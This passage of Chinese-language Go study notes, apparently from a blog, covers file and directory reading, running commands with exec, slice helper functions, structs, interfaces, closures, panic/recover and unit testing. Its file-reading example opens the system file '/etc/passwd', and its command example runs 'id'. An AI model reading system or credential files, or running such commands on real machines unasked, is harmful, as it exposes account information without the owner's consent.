class="string">'/etc/passwd'</span>)  <span class="comment">// content 为 []byte</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 目录</span></span><br><span class="line">ioutil.ReadDir(<span class="string">"."</span>)</span><br></pre></td></tr></table></figure><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">cmd := exec.Command(<span class="string">"id"</span>)</span><br><span class="line">stdoutStderr, err := cmd.CombinedOutput()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Fatal(err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"strings"</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回目标字符串 `t` 出现的的第一个索引位置，或者在没有匹配值时返回 -1。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(vs []<span class="keyword">string</span>, t <span class="keyword">string</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i, v := <span class="keyword">range</span> vs &#123;</span><br><span class="line">        <span class="keyword">if</span> v == t &#123;</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果目标字符串 `t` 在这个切片中则返回 `true`。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Include</span><span class="params">(vs []<span class="keyword">string</span>, t <span class="keyword">string</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Index(vs, t) &gt;= <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果这些切片中的字符串有一个满足条件 `f` 则返回 `true`。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Any</span><span class="params">(vs []<span class="keyword">string</span>, f <span class="keyword">func</span>(<span class="keyword">string</span>)</span> <span class="title">bool</span>) <span class="title">bool</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> _, v := <span class="keyword">range</span> vs &#123;</span><br><span class="line">        <span class="keyword">if</span> f(v) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果切片中的所有字符串都满足条件 `f` 则返回 `true`。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">All</span><span class="params">(vs []<span class="keyword">string</span>, f <span class="keyword">func</span>(<span class="keyword">string</span>)</span> <span class="title">bool</span>) <span class="title">bool</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> _, v := <span class="keyword">range</span> vs &#123;</span><br><span class="line">        <span class="keyword">if</span> !f(v) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回一个包含所有切片中满足条件 `f` 的字符串的新切片。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Filter</span><span class="params">(vs []<span class="keyword">string</span>, f <span class="keyword">func</span>(<span class="keyword">string</span>)</span> <span class="title">bool</span>) []<span class="title">string</span></span> &#123;</span><br><span class="line">    vsf := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> _, v := <span class="keyword">range</span> vs &#123;</span><br><span class="line">        <span class="keyword">if</span> f(v) &#123;</span><br><span class="line">            vsf = <span class="built_in">append</span>(vsf, v)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> vsf</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回一个对原始切片中所有字符串执行函数 `f` 后的新切片。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Map</span><span class="params">(vs []<span class="keyword">string</span>, f <span class="keyword">func</span>(<span class="keyword">string</span>)</span> <span class="title">string</span>) []<span class="title">string</span></span> &#123;</span><br><span class="line">    vsm := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="built_in">len</span>(vs))</span><br><span class="line">    <span class="keyword">for</span> i, v := <span class="keyword">range</span> vs &#123;</span><br><span class="line">        vsm[i] = f(v)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> vsm</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里试试这些组合函数。</span></span><br><span class="line">    <span class="keyword">var</span> strs = []<span class="keyword">string</span>&#123;<span class="string">"peach"</span>, <span class="string">"apple"</span>, <span class="string">"pear"</span>, <span class="string">"plum"</span>&#125;</span><br><span class="line"></span><br><span class="line">    fmt.Println(Index(strs, <span class="string">"pear"</span>))</span><br><span class="line"></span><br><span class="line">    fmt.Println(Include(strs, <span class="string">"grape"</span>))</span><br><span class="line"></span><br><span class="line">    fmt.Println(Any(strs, <span class="function"><span class="keyword">func</span><span class="params">(v <span class="keyword">string</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">        <span class="keyword">return</span> strings.HasPrefix(v, <span class="string">"p"</span>)</span><br><span class="line">    &#125;))</span><br><span class="line"></span><br><span class="line">    fmt.Println(All(strs, <span class="function"><span class="keyword">func</span><span class="params">(v <span class="keyword">string</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">        <span class="keyword">return</span> strings.HasPrefix(v, <span class="string">"p"</span>)</span><br><span class="line">    &#125;))</span><br><span class="line"></span><br><span class="line">    fmt.Println(Filter(strs, <span class="function"><span class="keyword">func</span><span class="params">(v <span class="keyword">string</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">        <span class="keyword">return</span> strings.Contains(v, <span class="string">"e"</span>)</span><br><span class="line">    &#125;))</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 上面的例子都是用的匿名函数，但是你也可以使用类型正确的命名函数</span></span><br><span class="line">    fmt.Println(Map(strs, strings.ToUpper))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="面向“对象”"><a href="#面向“对象”" class="headerlink" title="面向“对象”"></a>面向“对象”</h2><p>仅支持封装，不支持继承和多态</p><h3 id="结构体和方法"><a href="#结构体和方法" class="headerlink" title="结构体和方法"></a>结构体和方法</h3><p>用大小写来区分，大写开头 public、小写开头 private，private 只能在当前包内使用（使用工厂模式解决，即自行实现（大写开头）构造函数）</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Books <span class="keyword">struct</span> &#123;</span><br><span class="line">    title <span class="keyword">string</span></span><br><span class="line">    author <span class="keyword">string</span></span><br><span class="line">    book_id <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">books := Books&#123;</span><br><span class="line">    title:   <span class="string">"Go"</span>,</span><br><span class="line">    author:  <span class="string">"Tim"</span>,</span><br><span class="line">    book_id: <span class="string">"1"</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// tag</span></span><br><span class="line"><span class="keyword">type</span> Member <span class="keyword">struct</span> &#123;</span><br><span class="line">    Id     <span class="keyword">int</span>    <span class="string">`json:"id,-"`</span></span><br><span class="line">    Name   <span class="keyword">string</span> <span class="string">`json:"name"`</span></span><br><span class="line">    Email  <span class="keyword">string</span> <span class="string">`json:"email"`</span></span><br><span class="line">    Gender <span class="keyword">int</span>    <span class="string">`json:"gender,"`</span></span><br><span class="line">    Age    <span class="keyword">int</span>    <span class="string">`json:"age"`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">books = Books&#123;<span class="string">"Go"</span>, <span class="string">"Tim"</span>, <span class="string">"2"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 传值，注意一致性，如果有指针接收，最好全用指针接收</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(book Books)</span> <span class="title">print</span><span class="params">()</span></span> &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 传指针，nil 指针也可以调用方法，某些情景下需要加下判断</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(book *Books)</span> <span class="title">print</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> book == <span class="literal">nil</span> &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 继承</span></span><br><span class="line"><span class="keyword">type</span> Edu <span class="keyword">struct</span> &#123;</span><br><span class="line">    Books  <span class="comment">// 写个匿名结构体就行</span></span><br><span class="line">    name <span class="keyword">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="包和封装"><a href="#包和封装" class="headerlink" title="包和封装"></a>包和封装</h3><p>同一个目录下只能有一个包，main 包下为主入口</p><p>为结构定义的方法必须放在同一个包内</p><p>可以是不同文件</p><p>import 中可以使用相对路径 <code>./</code>、<code>../</code> 引用包，如果没有用相对路径，go 会去 $GOPATH/src/ 目录找</p><h3 id="扩展已有类型"><a href="#扩展已有类型" class="headerlink" title="扩展已有类型"></a>扩展已有类型</h3><h4 id="定义别名"><a href="#定义别名" class="headerlink" title="定义别名"></a>定义别名</h4><h4 id="使用组合"><a href="#使用组合" class="headerlink" title="使用组合"></a>使用组合</h4><h3 id="使用内嵌来扩展已有类型"><a href="#使用内嵌来扩展已有类型" class="headerlink" title="使用内嵌来扩展已有类型"></a>使用内嵌来扩展已有类型</h3><h2 id="依赖管理"><a href="#依赖管理" class="headerlink" title="依赖管理"></a>依赖管理</h2><h3 id="依赖管理-1"><a href="#依赖管理-1" class="headerlink" title="依赖管理"></a>依赖管理</h3><h3 id="GOPATH-和-GOVENDOR"><a href="#GOPATH-和-GOVENDOR" class="headerlink" title="GOPATH 和 GOVENDOR"></a>GOPATH 和 GOVENDOR</h3><p>gopath 和 path 一样，可以接受多个路径，路径之间用冒号分隔</p><h3 id="go-mod"><a href="#go-mod" class="headerlink" title="go mod"></a>go mod</h3><p>go: cannot find main module; see ‘go help modules’</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">go env -w GO111MODULE=on</span><br><span class="line"></span><br><span class="line">go env -w GOPROXY=https://mirrors.aliyun.com/goproxy/,direct</span><br></pre></td></tr></table></figure><p>go mod 子命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">go mod init module_name</span><br><span class="line"></span><br><span class="line">go list -m -u all  # 检查可以升级的包</span><br><span class="line">go get -u need-upgrade-package  # 升级</span><br><span class="line"></span><br><span class="line">download</span><br><span class="line">edit</span><br><span class="line">graph</span><br><span class="line">init</span><br><span class="line">tidy</span><br><span class="line">vendor</span><br><span class="line">verify</span><br><span class="line">why</span><br></pre></td></tr></table></figure><h2 id="面向接口"><a href="#面向接口" class="headerlink" title="面向接口"></a>面向接口</h2><h3 id="duck-typing"><a href="#duck-typing" class="headerlink" title="duck typing"></a>duck typing</h3><ul><li>“像鸭子走路，像鸭子叫，长的像鸭子，那么就是鸭子”</li><li>描述事物的外部行为而非内部结构</li><li>严格来说 go 属于结构化类型系统，类似 duck typing</li></ul><p>Python 中的鸭子</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">// 运行时才知道传入的 retriever 有没有 get 方法</span><br><span class="line">// 需要注释来说明接口</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span><span class="params">(retriever)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> retriever.get(<span class="string">"http://qq.com"</span>)</span><br></pre></td></tr></table></figure><p>C++ 中的鸭子</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 同 Python</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">R</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">string</span> <span class="title">download</span>(<span class="title">const</span> <span class="title">R</span>&amp; <span class="title">retriver</span>) &#123;</span></span><br><span class="line">    <span class="keyword">return</span> retriver.get(<span class="string">"http://qq.com"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Java 中的类似代码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 传入的参数必须实现 Retriever 接口</span></span><br><span class="line"><span class="comment">// 不是 duck typing</span></span><br><span class="line"><span class="comment">// 同时需要 Readable、Appendable 怎么办？（Apache polygene）</span></span><br><span class="line">&lt;R extends Retriver&gt;</span><br><span class="line"><span class="function">String <span class="title">download</span><span class="params">(R r)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> r.get(<span class="string">"http://qq.com"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Go</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Retriver <span class="keyword">interface</span> &#123;</span><br><span class="line">    Get(source <span class="keyword">string</span>) <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">download</span><span class="params">(retriver Retriver)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> retriver.Get(<span class="string">"http://qq.com"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="接口的概念"><a href="#接口的概念" class="headerlink" title="接口的概念"></a>接口的概念</h3><p>接口由使用者定义</p><p>接口的实现时隐式的，只要实现里面的方法（不太理解这句话</p><p>接口本身不能创建实例，但可以指向一个实现了该接口的（自定义）类型的变量。</p><p>一个自定义类型需要将某个接口的所有方法都实现，才说这个自定义类型实现了该接口，否则编译不通过。</p><p>一个自定义类型可以实现多个接口</p><p>一个接口可以继承多个接口</p><p>interface 类型默认是一个指针</p><p>空接口 <code>interface{}</code> 没有任何方法，所以所有类型都实现了空接口，即可以把任何一个变量赋值给空接口。</p><p><strong>类型断言</strong></p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line"><span class="keyword">var</span> f <span class="keyword">float32</span> = <span class="number">1.1</span></span><br><span class="line">x = f</span><br><span class="line">y := x.(<span class="keyword">float32</span>)  <span class="comment">// 这里改成 float64 将 panic</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 加入检测</span></span><br><span class="line"><span class="keyword">if</span> y, ok := x.(<span class="keyword">float32</span>); ok &#123;</span><br><span class="line">    <span class="comment">// xx</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>继承与接口</strong></p><p>当 A 结构体继承了 B 结构体，那么 A 就有了 B 的所有字段和方法，并可以直接调用。</p><p>当 A 结构体需要扩展功能，同时不希望破坏继承关系，实现某个接口即可。</p><p>因此，实现接口可以看做是对继承机制的补充。</p><p>继承的价值：解决代码的复用性和可维护性。</p><p>接口的价值：设计，设计好各种规范（方法），让其它自定义类型去实现这种方法。</p><p>接口比继承更加灵活，继承是满足 is-a 的关系，而接口只需满足 like-a 的关系，在一定程度上实现了解耦。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbaenlc9mtj20gs05dtc1.jpg" alt="image.png"></p><h3 id="接口的定义和实现"><a href="#接口的定义和实现" class="headerlink" title="接口的定义和实现"></a>接口的定义和实现</h3><blockquote><p>实际上就是实现了多态，同样的方法在不同对象调用时表现不同的意义？</p><p>还有个典型的列子，即 <code>sort()</code>，需要实现三个方法就可以给自定义类型排序</p><ul><li>Len</li><li>Less</li><li>Swap</li></ul></blockquote><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 几何学接口</span></span><br><span class="line"><span class="keyword">type</span> geometry <span class="keyword">interface</span> &#123;</span><br><span class="line">    area() <span class="keyword">float64</span></span><br><span class="line">    perim() <span class="keyword">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> rect <span class="keyword">struct</span> &#123;</span><br><span class="line">    width, height <span class="keyword">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> circle <span class="keyword">struct</span> &#123;</span><br><span class="line">    radius <span class="keyword">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r rect)</span> <span class="title">area</span> <span class="title">float64</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> r.width * r.height</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r rect)</span> <span class="title">perim</span><span class="params">()</span> <span class="title">float64</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (r.width + r.height) * <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c circle)</span> <span class="title">area</span><span class="params">()</span> <span class="title">float64</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> math.Pi * c.radius * c.radius</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c circle)</span> <span class="title">perim</span><span class="params">()</span> <span class="title">float64</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span> * math.Pi * c.radius</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 统一</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">measure</span><span class="params">(g geometry)</span></span> &#123;</span><br><span class="line">    fmt.Println(g)</span><br><span class="line">    fmt.Println(g.area())</span><br><span class="line">    fmt.Println(g.perim())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    r := rect&#123;width: <span class="number">3</span>, height: <span class="number">4</span>&#125;</span><br><span class="line">    c := circle&#123;radius: <span class="number">5</span>&#125;</span><br><span class="line">    </span><br><span class="line">    measure(r)</span><br><span class="line">    measure(c)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="接口的值类型"><a href="#接口的值类型" class="headerlink" title="接口的值类型"></a>接口的值类型</h3><h3 id="接口的组合"><a href="#接口的组合" class="headerlink" title="接口的组合"></a>接口的组合</h3><h3 id="常用系统接口"><a href="#常用系统接口" class="headerlink" title="常用系统接口"></a>常用系统接口</h3><h2 id="函数式编程"><a href="#函数式编程" class="headerlink" title="函数式编程"></a>函数式编程</h2><h3 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h3><p>函数内的局部变量 + 匿名函数构成闭包</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">adder</span><span class="params">()</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    sum := <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(value <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    sum += value</span><br><span class="line">    <span class="keyword">return</span> sum</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为函数实现接口</p><h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><p>使用反射遍历结构体字段，调用结构体的方法，并获取结构体标签的值。</p><p>定义多个函数，再定义一个适配器函数用作统一处理接口。</p><p>使用反射创建并操作结构体。</p><h2 id="错误处理和资源管理"><a href="#错误处理和资源管理" class="headerlink" title="错误处理和资源管理"></a>错误处理和资源管理</h2><h3 id="defer"><a href="#defer" class="headerlink" title="defer"></a>defer</h3><p>延时机制，在 return 后再调用，先 defer 的后调用。</p><p>常常需要创建资源（数据库连接、文件句柄、锁），使用 defer 来关闭更省心。</p><h3 id="错误处理概念"><a href="#错误处理概念" class="headerlink" title="错误处理概念"></a>错误处理概念</h3><h3 id="服务器统一出错处理"><a href="#服务器统一出错处理" class="headerlink" title="服务器统一出错处理"></a>服务器统一出错处理</h3><h3 id="panic-和-recover"><a href="#panic-和-recover" class="headerlink" title="panic 和 recover"></a>panic 和 recover</h3><p>panic 一旦出错直接终止程序。</p><p>recover 可对接收到的错误自定义处理。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> err := <span class="built_in">recover</span>(); err &#123;</span><br><span class="line">        <span class="built_in">println</span>(err)</span><br><span class="line">    &#125; </span><br><span class="line">&#125;()</span><br></pre></td></tr></table></figure><p>哪些不能 Recover：</p><ul><li>Thread Limit，超过了系统的线程限制，详细参考下面的说明；</li><li>Concurrent Map Writers，竞争条件，同时写 map，参考下面的例子。推荐使用标准库的 sync.Map 解决这个问题。</li></ul><h4 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h4><p>Go 的 err 过于简单，需要增加上下文信息。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Handler <span class="keyword">interface</span> &#123;</span><br><span class="line">    Filter(err error, r <span class="keyword">interface</span>&#123;&#125;) error</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Logger <span class="keyword">interface</span> &#123;</span><br><span class="line">    Ef(format <span class="keyword">string</span>, a ...<span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Handle panic by hdr, which filter the error.</span></span><br><span class="line"><span class="comment">// Finally log err with logger.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">HandlePanic</span><span class="params">(hdr Handler, logger Logger)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> handlePanic(<span class="built_in">recover</span>(), hdr, logger)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> hdrFunc <span class="function"><span class="keyword">func</span><span class="params">(err error, r <span class="keyword">interface</span>&#123;&#125;)</span> <span class="title">error</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="params">(v hdrFunc)</span> <span class="title">Filter</span><span class="params">(err error, r <span class="keyword">interface</span>&#123;&#125;)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> v(err, r)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> loggerFunc <span class="function"><span class="keyword">func</span><span class="params">(format <span class="keyword">string</span>, a ...<span class="keyword">interface</span>&#123;&#125;)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="params">(v loggerFunc)</span> <span class="title">Ef</span><span class="params">(format <span class="keyword">string</span>, a ...<span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">    v(format, a...)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Handle panic by hdr, which filter the error.</span></span><br><span class="line"><span class="comment">// Finally log err with logger.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">HandlePanicFunc</span><span class="params">(hdr <span class="keyword">func</span>(err error, r <span class="keyword">interface</span>&#123;&#125;)</span> <span class="title">error</span>,</span></span><br><span class="line"><span class="function">    <span class="title">logger</span> <span class="title">func</span><span class="params">(format <span class="keyword">string</span>, a ...<span class="keyword">interface</span>&#123;&#125;)</span>,</span></span><br><span class="line"><span class="function">) <span class="title">error</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> f Handler</span><br><span class="line">    <span class="keyword">if</span> hdr != <span class="literal">nil</span> &#123;</span><br><span class="line">        f = hdrFunc(hdr)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> l Logger</span><br><span class="line">    <span class="keyword">if</span> logger != <span class="literal">nil</span> &#123;</span><br><span class="line">        l = loggerFunc(logger)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> handlePanic(<span class="built_in">recover</span>(), f, l)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handlePanic</span><span class="params">(r <span class="keyword">interface</span>&#123;&#125;, hdr Handler, logger Logger)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> r != <span class="literal">nil</span> &#123;</span><br><span class="line">        err, ok := r.(error)</span><br><span class="line">        <span class="keyword">if</span> !ok &#123;</span><br><span class="line">            err = fmt.Errorf(<span class="string">"r is %v"</span>, r)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> hdr != <span class="literal">nil</span> &#123;</span><br><span class="line">            err = hdr.Filter(err, r)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; logger != <span class="literal">nil</span> &#123;</span><br><span class="line">            logger.Ef(<span class="string">"panic err %+v"</span>, err)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">defer</span> HandlePanicFunc(<span class="literal">nil</span>, <span class="function"><span class="keyword">func</span><span class="params">(format <span class="keyword">string</span>, a ...<span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">            fmt.Println(fmt.Sprintf(format, a...))</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">panic</span>(<span class="string">"ok"</span>)</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    logger := <span class="function"><span class="keyword">func</span><span class="params">(format <span class="keyword">string</span>, a ...<span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">        fmt.Println(fmt.Sprintf(format, a...))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">defer</span> HandlePanicFunc(<span class="literal">nil</span>, logger)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">panic</span>(<span class="string">"ok"</span>)</span><br><span class="line">    &#125;()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="问题追踪和调试"><a href="#问题追踪和调试" class="headerlink" title="问题追踪和调试"></a>问题追踪和调试</h3><h4 id="打印日志"><a href="#打印日志" class="headerlink" title="打印日志"></a>打印日志</h4><h4 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h4><h2 id="测试与调优"><a href="#测试与调优" class="headerlink" title="测试与调优"></a>测试与调优</h2><h3 id="TDD"><a href="#TDD" class="headerlink" title="TDD"></a>TDD</h3><p><strong>先写测试</strong> =&gt; <strong>尝试运行测试</strong> =&gt; <strong>写少量代码跑起来</strong> =&gt; <strong>补充完整通过测试</strong> =&gt; <strong>重构</strong> =&gt; <strong>跳到第二步</strong></p><p>先写测试代码，编写足够的代码来使编译通过，<em>仅此而已</em> 。</p><p>请记住，我们要查看的是，测试是否因为合理的原因失败。</p><p>迭代！</p><p><strong>尽你所能拆分需求是一项很重要的技能，这样你就能拥有可以工作的软件</strong>。</p><p><strong>在测试的支持下，将功能切分成小的功能点，并使其首尾相连顺利的运行。</strong></p><p>敏捷开发：<a href="http://wiki.c2.com/?MakeItWorkMakeItRightMakeItFast" target="_blank" rel="noopener">让它运作，使它正确，使它快速</a></p><p><a href="http://wiki.c2.com/?PrematureOptimization" target="_blank" rel="noopener">过早的优化是万恶之源</a> —— Donald Knuth</p><h3 id="单元测试"><a href="#单元测试" class="headerlink" title="单元测试"></a>单元测试</h3><p>单元测试：保证项目工程质量的最有效办法。</p><ul><li>可测试：意味着面向接口编程以及减少单个函数中包含的逻辑，使用『小方法』；</li><li>组织方式：使用 Go 语言默认的 Test 框架、开源的 <code>suite</code> 或者 BDD 的风格对单元测试进行合理组织；</li><li>Mock 方法：四种不同的单元测试 Mock 方法；<ul><li><a href="https://github.com/golang/mock" target="_blank" rel="noopener">gomock</a>：最标准的也是最被鼓励的方式；</li><li><a href="https://github.com/DATA-DOG/go-sqlmock" target="_blank" rel="noopener">sqlmock</a>：处理依赖的数据库；</li><li><a 